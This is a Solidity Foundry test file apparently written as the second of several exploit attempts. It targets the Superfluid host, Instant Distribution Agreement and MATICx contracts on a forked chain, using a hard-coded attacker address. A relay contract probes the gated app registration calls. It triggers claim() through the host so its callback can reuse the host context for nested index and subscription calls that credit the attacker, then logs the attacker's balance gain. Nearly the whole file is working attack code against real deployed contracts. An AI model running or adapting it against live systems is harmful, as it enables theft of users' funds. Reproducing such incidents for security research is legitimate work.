// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperToken {
    function balanceOf(address account) external view returns (uint256);
    function getHost() external view returns (address);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ISETH is ISuperToken {
    function upgradeByETH() external payable;
    function downgradeToETH(uint256 wad) external;
}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);

    function callAgreementWithContext(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData,
        bytes calldata ctx
    ) external returns (bytes memory newCtx, bytes memory returnedData);

    function registerApp(uint256 configWord) external;
    function registerAppByFactory(address app, uint256 configWord) external;
    function registerAppWithKey(uint256 configWord, string calldata registrationKey) external;
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function createIndex(
        ISuperToken token,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateIndex(
        ISuperToken token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateSubscription(
        ISuperToken token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getIndex(
        ISuperToken token,
        address publisher,
        uint32 indexId
    )
        external
        view
        returns (bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);

    function getSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber
    )
        external
        view
        returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

/// @title Attempt2
/// @notice Hypothesis A2: `claim()` called through `HOST.callAgreement(...)`
///         from a contract relay, not an EOA, yields a host-stamped ctx whose
///         `msgSender` is executable code. That should both avoid the
///         non-contract callback target seen in Attempt1 and enable a valid
///         `callAgreementWithContext(...)` subcall from inside the callback,
///         even though `registerApp(...)` is permission-gated.
contract Attempt2 is Test {
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    uint256 constant FORK_BLOCK = 27_039_967;
    uint32 constant TRIGGER_INDEX_ID = 55_200_001;
    uint32 constant NESTED_INDEX_ID = 55_200_002;
    uint256 constant SEED_WEI = 1;
    uint256 constant APP_LEVEL_FINAL = 1 << 1;

    ISuperfluidHost constant HOST = ISuperfluidHost(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 constant IDA =
        IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    ISETH constant MATICX = ISETH(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker");
        vm.label(address(HOST), "SuperfluidHost");
        vm.label(address(IDA), "IDA");
        vm.label(address(MATICX), "MATICx");
    }

    function test_hypothesisA2_host_claim_via_contract_relay() public {
        uint256 nativeBefore = ATTACKER.balance;

        console.log("[start] attacker native:", nativeBefore);
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);
        assertEq(MATICX.getHost(), address(HOST), "MATICx host mismatch");

        vm.startPrank(ATTACKER);

        ClaimRelay relay = new ClaimRelay(HOST, IDA, MATICX, ATTACKER, TRIGGER_INDEX_ID, NESTED_INDEX_ID);
        console.log("[setup] relay:", address(relay));

        relay.probeRegistration(APP_LEVEL_FINAL);
        _logRegistrationState(relay);

        relay.seedTriggerIndex{value: SEED_WEI}();
        _logTriggerState(address(relay));

        (bool eoaClaimOk, bytes memory eoaClaimRet) = _claimViaHostFromEOA(address(relay), address(relay), TRIGGER_INDEX_ID);
        console.log("[claim:eoa] ok:", eoaClaimOk);
        console.log("[claim:eoa] revert:");
        console.logBytes(eoaClaimRet);

        relay.claimTriggerIndex();
        _logRelayClaimState(relay);

        uint256 nestedPending = _logNestedState(address(relay));

        if (nestedPending > 0) {
            relay.claimFor(ATTACKER, NESTED_INDEX_ID);
            console.log("[nested-claim] ok:", relay.nestedClaimOk());
            console.log("[nested-claim] revert:");
            console.logBytes(relay.nestedClaimRevertData());
        }

        uint256 attackerMaticx = MATICX.balanceOf(ATTACKER);
        console.log("[state] attacker MATICx:", attackerMaticx);
        if (attackerMaticx > 0) {
            MATICX.downgradeToETH(attackerMaticx);
        }

        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        int256 nativeDelta = int256(nativeAfter) - int256(nativeBefore);
        console.log("[end] attacker native:", nativeAfter);
        console.log("[delta] attacker native:", nativeDelta);

        assertTrue(relay.hostClaimOk(), _decodeRevert(relay.hostClaimRevertData()));
        assertGt(relay.afterUpdatedCalls(), 0, "relay claim never reached afterAgreementUpdated");
        assertEq(relay.lastCtxMsgSender(), address(relay), "relay callback ctx did not preserve contract msgSender");
        assertTrue(relay.nestedCreateOk(), _decodeRevert(relay.nestedCreateRevertData()));
        assertTrue(relay.nestedUpdateSubscriptionOk(), _decodeRevert(relay.nestedUpdateSubscriptionRevertData()));
    }

    function _logRegistrationState(ClaimRelay relay) internal view {
        console.log("[register] registerApp ok:", relay.registerAppOk());
        console.log("[register] registerApp revert:");
        console.logBytes(relay.registerAppRevertData());
        console.log("[register] registerAppByFactory ok:", relay.registerAppByFactoryOk());
        console.log("[register] registerAppByFactory revert:");
        console.logBytes(relay.registerAppByFactoryRevertData());
        console.log("[register] registerAppWithKey ok:", relay.registerAppWithKeyOk());
        console.log("[register] registerAppWithKey revert:");
        console.logBytes(relay.registerAppWithKeyRevertData());
    }

    function _logTriggerState(address relay) internal view {
        (bool triggerExists, uint128 triggerIndexValue,,) = IDA.getIndex(MATICX, relay, TRIGGER_INDEX_ID);
        (bool triggerSubExists, bool triggerApproved, uint128 triggerUnits, uint256 triggerPending) =
            IDA.getSubscription(MATICX, relay, TRIGGER_INDEX_ID, relay);
        console.log("[trigger] index exists:", triggerExists);
        console.log("[trigger] index value:", triggerIndexValue);
        console.log("[trigger] subscription exists:", triggerSubExists);
        console.log("[trigger] subscription approved:", triggerApproved);
        console.log("[trigger] subscription units:", triggerUnits);
        console.log("[trigger] pending distribution:", triggerPending);
    }

    function _claimViaHostFromEOA(address publisher, address subscriber, uint32 indexId)
        internal
        returns (bool ok, bytes memory ret)
    {
        bytes memory inner = abi.encodeCall(IDA.claim, (MATICX, publisher, indexId, subscriber, new bytes(0)));
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, inner, new bytes(0))));
    }

    function _logRelayClaimState(ClaimRelay relay) internal view {
        console.log("[claim:relay] ok:", relay.hostClaimOk());
        console.log("[claim:relay] revert:");
        console.logBytes(relay.hostClaimRevertData());

        console.log("[callback] afterAgreementUpdated calls:", relay.afterUpdatedCalls());
        console.log("[callback] last ctx msgSender:", relay.lastCtxMsgSender());
        console.log("[callback] last ctx callType:", relay.lastCtxCallType());
        console.log("[callback] nested createIndex ok:", relay.nestedCreateOk());
        console.log("[callback] nested createIndex revert:");
        console.logBytes(relay.nestedCreateRevertData());
        console.log("[callback] nested updateSubscription ok:", relay.nestedUpdateSubscriptionOk());
        console.log("[callback] nested updateSubscription revert:");
        console.logBytes(relay.nestedUpdateSubscriptionRevertData());
        console.log("[callback] nested updateIndex ok:", relay.nestedUpdateIndexOk());
        console.log("[callback] nested updateIndex revert:");
        console.logBytes(relay.nestedUpdateIndexRevertData());
    }

    function _logNestedState(address relay) internal view returns (uint256 nestedPending) {
        (bool nestedExists, uint128 nestedIndexValue,,) = IDA.getIndex(MATICX, relay, NESTED_INDEX_ID);
        console.log("[nested] index exists:", nestedExists);
        console.log("[nested] index value:", nestedIndexValue);
        if (!nestedExists) {
            console.log("[nested] subscription exists:", false);
            console.log("[nested] subscription approved:", false);
            console.log("[nested] subscription units:", uint256(0));
            console.log("[nested] pending distribution:", uint256(0));
            return 0;
        }

        (bool nestedSubExists, bool nestedApproved, uint128 nestedUnits, uint256 pending) =
            IDA.getSubscription(MATICX, relay, NESTED_INDEX_ID, ATTACKER);
        console.log("[nested] subscription exists:", nestedSubExists);
        console.log("[nested] subscription approved:", nestedApproved);
        console.log("[nested] subscription units:", nestedUnits);
        console.log("[nested] pending distribution:", pending);
        return pending;
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) {
                return "silent revert";
            }
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        if (revertData.length > 68) {
            return abi.decode(revertData, (string));
        }

        return "custom/unknown";
    }

    receive() external payable {}
}

contract ClaimRelay {
    using ContextUtils for bytes;

    ISuperfluidHost public immutable host;
    IInstantDistributionAgreementV1 public immutable ida;
    ISETH public immutable token;
    address public immutable attacker;
    uint32 public immutable triggerIndexId;
    uint32 public immutable nestedIndexId;

    bool public registerAppOk;
    bytes public registerAppRevertData;
    bool public registerAppByFactoryOk;
    bytes public registerAppByFactoryRevertData;
    bool public registerAppWithKeyOk;
    bytes public registerAppWithKeyRevertData;

    bool public hostClaimOk;
    bytes public hostClaimRevertData;
    bool public nestedClaimOk;
    bytes public nestedClaimRevertData;

    uint256 public afterUpdatedCalls;
    address public lastCtxMsgSender;
    uint8 public lastCtxCallType;

    bool public nestedCreateOk;
    bytes public nestedCreateRevertData;
    bool public nestedUpdateSubscriptionOk;
    bytes public nestedUpdateSubscriptionRevertData;
    bool public nestedUpdateIndexOk;
    bytes public nestedUpdateIndexRevertData;

    bool internal nestedActionsDone;

    constructor(
        ISuperfluidHost host_,
        IInstantDistributionAgreementV1 ida_,
        ISETH token_,
        address attacker_,
        uint32 triggerIndexId_,
        uint32 nestedIndexId_
    ) {
        host = host_;
        ida = ida_;
        token = token_;
        attacker = attacker_;
        triggerIndexId = triggerIndexId_;
        nestedIndexId = nestedIndexId_;
    }

    function probeRegistration(uint256 configWord) external {
        try host.registerApp(configWord) {
            registerAppOk = true;
        } catch (bytes memory reason) {
            registerAppRevertData = reason;
        }

        try host.registerAppByFactory(address(this), configWord) {
            registerAppByFactoryOk = true;
        } catch (bytes memory reason) {
            registerAppByFactoryRevertData = reason;
        }

        try host.registerAppWithKey(configWord, "attempt2_probe") {
            registerAppWithKeyOk = true;
        } catch (bytes memory reason) {
            registerAppWithKeyRevertData = reason;
        }
    }

    function seedTriggerIndex() external payable {
        token.upgradeByETH{value: msg.value}();
        _callAgreement(abi.encodeCall(ida.createIndex, (token, triggerIndexId, new bytes(0))));
        _callAgreement(abi.encodeCall(ida.updateSubscription, (token, triggerIndexId, address(this), uint128(1), new bytes(0))));
        _callAgreement(abi.encodeCall(ida.updateIndex, (token, triggerIndexId, uint128(1), new bytes(0))));
    }

    function claimTriggerIndex() external {
        try host.callAgreement(
            ida, abi.encodeCall(ida.claim, (token, address(this), triggerIndexId, address(this), new bytes(0))), new bytes(0)
        ) {
            hostClaimOk = true;
        } catch (bytes memory reason) {
            hostClaimRevertData = reason;
        }
    }

    function claimFor(address subscriber, uint32 indexId) external {
        try host.callAgreement(ida, abi.encodeCall(ida.claim, (token, address(this), indexId, subscriber, new bytes(0))), new bytes(0))
        {
            nestedClaimOk = true;
        } catch (bytes memory reason) {
            nestedClaimRevertData = reason;
        }
    }

    function afterAgreementUpdated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx) {
        afterUpdatedCalls += 1;

        ContextUtils.Context memory decoded = ContextUtils.decodeContext(ctx);
        lastCtxMsgSender = decoded.msgSender;
        lastCtxCallType = decoded.callType;

        if (!nestedActionsDone) {
            nestedActionsDone = true;

            bytes memory nextCtx;
            (nestedCreateOk, nestedCreateRevertData, nextCtx) =
                _callAgreementWithContext(abi.encodeCall(ida.createIndex, (token, nestedIndexId, new bytes(0))), ctx);

            if (nestedCreateOk) {
                (nestedUpdateSubscriptionOk, nestedUpdateSubscriptionRevertData, nextCtx) = _callAgreementWithContext(
                    abi.encodeCall(ida.updateSubscription, (token, nestedIndexId, attacker, uint128(1), new bytes(0))), nextCtx
                );
            }

            if (nestedUpdateSubscriptionOk) {
                (nestedUpdateIndexOk, nestedUpdateIndexRevertData,) =
                    _callAgreementWithContext(abi.encodeCall(ida.updateIndex, (token, nestedIndexId, uint128(1), new bytes(0))), nextCtx);
            }
        }

        return ctx;
    }

    function beforeAgreementCreated(address, address, bytes32, bytes calldata, bytes calldata)
        external
        pure
        returns (bytes memory cbdata)
    {
        return cbdata;
    }

    function afterAgreementCreated(address, address, bytes32, bytes calldata, bytes calldata, bytes calldata ctx)
        external
        pure
        returns (bytes memory newCtx)
    {
        return ctx;
    }

    function beforeAgreementUpdated(address, address, bytes32, bytes calldata, bytes calldata)
        external
        pure
        returns (bytes memory cbdata)
    {
        return cbdata;
    }

    function beforeAgreementTerminated(address, address, bytes32, bytes calldata, bytes calldata)
        external
        pure
        returns (bytes memory cbdata)
    {
        return cbdata;
    }

    function afterAgreementTerminated(address, address, bytes32, bytes calldata, bytes calldata, bytes calldata ctx)
        external
        pure
        returns (bytes memory newCtx)
    {
        return ctx;
    }

    function _callAgreement(bytes memory inner) internal {
        host.callAgreement(ida, inner, new bytes(0));
    }

    function _callAgreementWithContext(bytes memory inner, bytes memory ctx)
        internal
        returns (bool ok, bytes memory revertData, bytes memory nextCtx)
    {
        try host.callAgreementWithContext(ida, inner, new bytes(0), ctx) returns (bytes memory newCtx, bytes memory) {
            ok = true;
            nextCtx = newCtx;
        } catch (bytes memory reason) {
            revertData = reason;
        }
    }

    receive() external payable {}
}
